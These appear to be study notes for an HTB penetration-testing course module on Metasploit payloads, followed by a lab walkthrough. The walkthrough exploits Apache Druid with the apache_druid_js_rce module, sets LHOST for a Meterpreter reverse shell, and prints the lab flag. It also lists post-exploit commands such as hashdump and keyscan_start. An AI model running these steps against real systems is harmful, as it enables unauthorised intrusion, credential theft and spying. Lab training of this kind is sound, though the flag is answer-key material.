### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Payloads <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Payloads



`Payload` = the code that runs on the target after the exploit lands. Three structural types — staged is denoted by `/` in the name (e.g. `windows/shell/bind_tcp` = stager + stage; `windows/shell_bind_tcp` = single).

| Type | Description |
|---|---|
| `Single` | Self-contained, all-in-one. Stable but large. |
| `Stager` | Small, sets up the network connection. |
| `Stage` | Pulled down by the stager — Meterpreter, VNC, etc. |

Reverse vs bind: reverse connects out (less likely to trip prevention systems); bind listens on the target.

`Meterpreter` — DLL-injected payload, lives entirely in memory, AES-encrypted comms, supports plugins/extensions loaded on the fly.

List & filter payloads — `grep` chains in msfconsole:

```diff
+ msf6 > show payloads
+ msf6 exploit(...) > grep meterpreter show payloads
+ msf6 exploit(...) > grep meterpreter grep reverse_tcp show payloads
+ msf6 exploit(...) > grep -c meterpreter show payloads
```

Select a payload by index:

```diff
+ msf6 exploit(...) > set payload 15
```

Required payload params:

| Param | Description |
|---|---|
| `LHOST` | Attacker IP — call `ifconfig` from `msfconsole` to grab |
| `LPORT` | Attacker listening port (default 4444) |
| `RHOSTS` | Target IP / range / file |
| `RPORT` | Target service port |

Common Windows payloads:

| Payload | Description |
|---|---|
| `generic/shell_bind_tcp` | Generic bind TCP shell |
| `generic/shell_reverse_tcp` | Generic reverse TCP shell |
| `windows/x64/exec` | Run arbitrary command |
| `windows/x64/shell_reverse_tcp` | Single reverse TCP shell |
| `windows/x64/shell/reverse_tcp` | Staged reverse TCP shell |
| `windows/x64/meterpreter/$` | Meterpreter (all variants) |
| `windows/x64/powershell/$` | Interactive PowerShell session |
| `windows/x64/vncinject/$` | VNC reflective injection |

Useful Meterpreter post-exploit primitives: `getuid`, `hashdump`, `ps`, `migrate`, `screenshot`, `keyscan_start`, `webcam_snap`, `getsystem`, `shell` (drops to host CLI).

<br>

---

<br>

### Payloads Exercise

IP: 10.129.254.229 then 10.129.232.108

---

### Question 1:
Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.

```diff
+ $ sudo nmap -sT -sC -sV -A -F -O -v 10.129.254.229
```

	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
	8081/tcp open  http    Jetty 9.4.12.v20180830
	8888/tcp open  http    Jetty 9.4.12.v20180830
	|_http-title: Apache Druid

#### Browse to `http://<IP>:8888/unified-console.html` — Apache Druid 0.17.1 web console.

#### Search for the multi-word Druid exploit:

```diff
+ msf6 > grep druid search linux exploit
+ msf6 > use 144
```

	exploit/linux/http/apache_druid_js_rce  2021-01-21  excellent  Yes  Apache Druid 0.20.0 Remote Command Execution

```diff
+ msf6 exploit(linux/http/apache_druid_js_rce) > set rhost 10.129.232.108
+ msf6 exploit(linux/http/apache_druid_js_rce) > set lhost 10.10.15.149
+ msf6 exploit(linux/http/apache_druid_js_rce) > exploit
```

	[+] The target is vulnerable.
	[*] Sending stage (3090404 bytes) to 10.129.232.108
	[*] Meterpreter session 1 opened (10.10.15.149:4444 -> 10.129.232.108:51772)

#### Read the flag from /root:

```diff
+ (Meterpreter 1)(/root/druid) > cd ..
+ (Meterpreter 1)(/root) > cat flag.txt
```

	HTB{MSF_Expl01t4t10n}

&#x1F6A9; found **HTB{MSF_Ex--edit--01t4t10n}**.
